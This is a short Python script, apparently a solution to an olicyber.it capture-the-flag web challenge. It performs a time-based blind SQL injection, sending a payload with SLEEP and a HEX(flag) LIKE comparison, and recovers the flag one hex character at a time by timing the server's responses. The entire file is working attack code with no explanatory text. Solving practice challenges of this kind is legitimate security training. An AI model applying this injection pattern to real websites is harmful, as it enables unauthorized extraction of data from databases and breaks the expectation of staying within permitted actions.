from sql import Inj
from time import time

inj = Inj('http://web-17.challs.olicyber.it')

dictionary = '0123456789abcdef'
result = ''

while True:
    for c in dictionary:
        question = f"1' AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE '{result + c}%')='1"
        
        start = time()
        response, error = inj.time(question)
        elapsed = time() - start

        if elapsed > 1:
            result += c
            print(result)
            break
    else:
        # We didn't find any match, so we are done
        print(bytes.fromhex(result).decode())
        break 